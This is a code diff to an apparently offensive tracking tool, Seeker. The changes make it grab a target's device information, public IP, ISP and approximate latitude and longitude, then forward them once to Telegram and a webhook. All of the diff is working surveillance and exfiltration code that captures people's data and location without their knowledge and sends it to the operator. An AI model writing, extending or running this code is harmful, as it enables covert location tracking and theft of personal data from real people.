@@ -83,6 +83,7 @@ TEMP_KML = f'{path_to_script}/template/sample.kml'
 META_FILE = f'{path_to_script}/metadata.json'
 META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
 PID_FILE = f'{path_to_script}/pid'
+info_sent = False
 
 if not path.isdir(LOG_DIR):
     mkdir(LOG_DIR)
@@ -312,19 +313,29 @@ def server():
 
 
 def wait():
+    global info_sent
     printed = False
+    info_flag = False
     while True:
         sleep(2)
         size = path.getsize(RESULT)
+        size2 = path.getsize(INFO)
         if size == 0 and printed is False:
             utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
             printed = True
+        if size == 0 and size2 > 0 and info_flag is False and printed is True:
+           # print("info grabbed ")
+            data_parser()
+            utils.print(f'{G}[+] {C}Grabbed Device-INFO...{Y}[ctrl+c to exit]{W}\n')
+            info_flag = True
+            printed = False
         if size > 0:
             data_parser()
             printed = False
 
 
 def data_parser():
+    global info_sent
     data_row = []
     with open(INFO, 'r') as info_file:
         info_content = info_file.read()
@@ -370,9 +381,10 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 """
-        utils.print(device_info)
-        send_telegram(info_json, 'device_info')
-        send_webhook(info_json, 'device_info')
+        if info_sent is False:
+            utils.print(device_info)
+            send_telegram(info_json, 'device_info')
+            send_webhook(info_json, 'device_info')
 
         if ip_address(var_ip).is_private:
             utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
@@ -389,9 +401,11 @@ def data_parser():
                 var_city = str(data['city'])
                 var_org = str(data['org'])
                 var_isp = str(data['isp'])
+                var_long = str(data['longitude'])
+                var_lat = str(data['latitude'])
 
                 data_row.extend(
-                    [var_continent, var_country, var_region, var_city, var_org, var_isp]
+                    [var_continent, var_country, var_region, var_city, var_org, var_isp, var_lat, var_long]
                 )
                 ip_info = f"""{Y}[!] IP Information :{W}
 
@@ -401,13 +415,20 @@ def data_parser():
 {G}[+] {C}City      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
+{G}[+] {C}Latitude  : {W}{var_lat}
+{G}[+] {C}Longitude : {W}{var_long}
 """
-                utils.print(ip_info)
-                send_telegram(data, 'ip_info')
-                send_webhook(data, 'ip_info')
+                if info_sent is False:
+                    utils.print(ip_info)
+                    send_telegram(data, 'ip_info')
+                    send_webhook(data, 'ip_info')
+                    info_sent = True
+
 
     with open(RESULT, 'r') as result_file:
         results = result_file.read()
+        if not results or results.strip() == '':
+            return
         try:
             result_json = loads(results)
         except decoder.JSONDecodeError:
